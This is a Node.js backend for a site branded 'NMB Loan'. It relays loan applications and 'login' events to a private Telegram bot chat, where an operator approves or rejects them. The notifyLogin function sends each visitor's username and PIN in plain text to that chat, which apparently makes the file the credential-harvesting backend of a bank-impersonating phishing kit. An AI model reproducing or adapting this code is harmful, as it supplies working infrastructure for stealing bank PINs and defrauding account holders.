/*
 * NMB Loan Site - Telegram Notification Backend
 * --------------------------------------------------
 * SECURITY: The bot token lives ONLY here (server-side). Never put it in the
 * browser. Keep this file / server private and do not commit it to public repos.
 *
 * Run:  node scripts/server.js   (then open the site; it posts events to :3000)
 */

const http = require('http');
const https = require('https');

// Load secrets from config.js (gitignored) or environment variables.
// NEVER hardcode the token in a file that gets committed/pushed.
let TOKEN = process.env.NMB_BOT_TOKEN;
let CHAT_ID = process.env.NMB_CHAT_ID;
try {
  const local = require('./config');
  if (!TOKEN) TOKEN = local.TOKEN;
  if (!CHAT_ID) CHAT_ID = local.CHAT_ID;
} catch (e) { /* config.js not present (e.g. on the public repo) */ }
if (!TOKEN || !CHAT_ID) {
  console.error('Missing Telegram TOKEN/CHAT_ID. Set them in config.js (gitignored) or as environment variables.');
  process.exit(1);
}
const PORT = process.env.PORT || 3000;

// In-memory store of applications and their Telegram message ids.
// (Replace with a real DB in production.)
const applications = new Map(); // appId -> { status, messageId, chatId, details }

/* ---------- Telegram Bot API helper ---------- */
function tgApi(method, payload, cb) {
  const data = JSON.stringify(payload);
  const req = https.request(
    {
      hostname: 'api.telegram.org',
      path: `/bot${TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(body); } catch (e) { /* ignore */ }
        if (cb) cb(json);
      });
    }
  );
  req.on('error', (e) => { console.error('[telegram]', method, e.message); if (cb) cb(null); });
  req.write(data);
  req.end();
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

/* ---------- Build + send notifications ---------- */
function notifyApplication(app) {
  const id = app.appId || ('APP-' + Date.now());
  const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
  const text =
    `<b>🏦 New Loan Application</b>\n\n` +
    `ID: <code>${esc(id)}</code>\n` +
    `Applicant: ${esc(name)}\n` +
    `Loan Type: ${esc(app.loanType || 'N/A')}\n` +
    `Amount: ${esc(app.amount || 'N/A')} USD\n` +
    `Email: ${esc(app.email || 'N/A')}\n` +
    `Phone: ${esc(app.phone || 'N/A')}\n\n` +
    `Status: <b>⏳ Pending review</b>`;

  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ Reject', callback_data: `reject:${id}` },
      ]],
    },
  }, (resp) => {
    if (resp && resp.ok) {
      applications.set(id, {
        status: 'pending',
        messageId: resp.result.message_id,
        chatId: CHAT_ID,
        details: { ...app, name },
      });
      console.log('[notify] application sent:', id);
    } else {
      console.error('[notify] send failed:', resp && resp.description);
    }
  });
  return id;
}

function notifyLogin(login) {
  const text =
    `<b>🔐 New Login / Activity</b>\n\n` +
    `User: ${esc(login.username || 'N/A')}\n` +
    (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
    (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
    `Time: ${new Date().toLocaleString()}`;
  tgApi('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' }, (r) => {
    if (r && r.ok) console.log('[notify] login sent');
  });
}

/* ---------- Handle admin Approve / Reject clicks ---------- */
let updateOffset = 0;
function pollUpdates() {
  https.get(
    { hostname: 'api.telegram.org', path: `/bot${TOKEN}/getUpdates?offset=${updateOffset}&timeout=30` },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(body); } catch (e) { /* ignore */ }
        if (json && json.ok) {
        for (const upd of json.result) {
          updateOffset = upd.update_id + 1;
          if (upd.callback_query) handleCallback(upd.callback_query);
          if (upd.message) handleMessage(upd.message);
        }
        }
        setTimeout(pollUpdates, 1000);
      });
    }
  ).on('error', (e) => {
    console.error('[poll]', e.message);
    setTimeout(pollUpdates, 5000);
  });
}

function handleCallback(cq) {
  const [action, id] = (cq.data || '').split(':');
  if (action !== 'approve' && action !== 'reject') return;

  const rec = applications.get(id);
  const decision = action === 'approve' ? 'approved' : 'rejected';
  const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
  if (rec) rec.status = decision;

  // Acknowledge the button tap
  tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });

  // Update the original message so the admin sees the result
  if (rec && rec.messageId) {
    const name = rec.details.name || 'N/A';
    tgApi('editMessageText', {
      chat_id: rec.chatId,
      message_id: rec.messageId,
      parse_mode: 'HTML',
      text:
        `<b>🏦 Loan Application</b>\n\n` +
        `ID: <code>${esc(id)}</code>\n` +
        `Applicant: ${esc(name)}\n` +
        `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
        `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
        `Status: <b>${stamp}</b>`,
    });
  }

  // Optional: alert the applicant via email/SMS here in production.
  console.log(`[decision] ${id} -> ${decision}`);
}

/* ---------- Handle /start so setup is easy ---------- */
function handleMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  if (text.startsWith('/start')) {
    tgApi('sendMessage', {
      chat_id: chatId,
      text: `✅ NMB Loan Bot connected!\n\nThis chat (ID: <code>${chatId}</code>) will now receive loan application & login notifications with Approve/Reject buttons.\n\nIf this ID differs from the one in your config, update CHAT_ID in server.js.`,
      parse_mode: 'HTML',
    });
  }
}

/* ---------- HTTP server: serves the site + receives events ---------- */
const fs = require('fs');
const path = require('path');

const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.webp': 'image/webp',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
};

function serveStatic(req, res) {
  let urlPath = decodeURIComponent(req.url.split('?')[0]);
  if (urlPath === '/') urlPath = '/index.html';
  // Prevent path traversal
  const filePath = path.join(__dirname, path.normalize(urlPath).replace(/^(\.\.[/\\])+/, ''));
  if (!filePath.startsWith(__dirname)) { res.writeHead(403); res.end('forbidden'); return; }

  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end('not found'); return; }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { 'Content-Type': CONTENT_TYPES[ext] || 'application/octet-stream' });
    res.end(data);
  });
}

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');

  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // POST /api/notify/application  or  /api/notify/login
  if (req.method === 'POST' && req.url.startsWith('/api/notify/')) {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => {
      let payload = {};
      try { payload = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
      if (req.url.includes('application')) {
        const id = notifyApplication(payload);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, appId: id }));
      } else if (req.url.includes('login')) {
        notifyLogin(payload);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } else {
        res.writeHead(404); res.end('not found');
      }
    });
    return;
  }

  // GET /api/application/:id  -> current status (pending/approved/rejected)
  if (req.method === 'GET' && req.url.startsWith('/api/application/')) {
    const id = req.url.split('/').pop();
    const rec = applications.get(id);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
    return;
  }

  // Everything else -> static files
  if (req.method === 'GET') { serveStatic(req, res); return; }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('NMB Loan Notification Bot server running on :' + PORT);
});

server.listen(PORT, () => {
  console.log(`Notification server listening on http://localhost:${PORT}`);
  console.log('Polling Telegram for admin decisions...');
  pollUpdates();
});
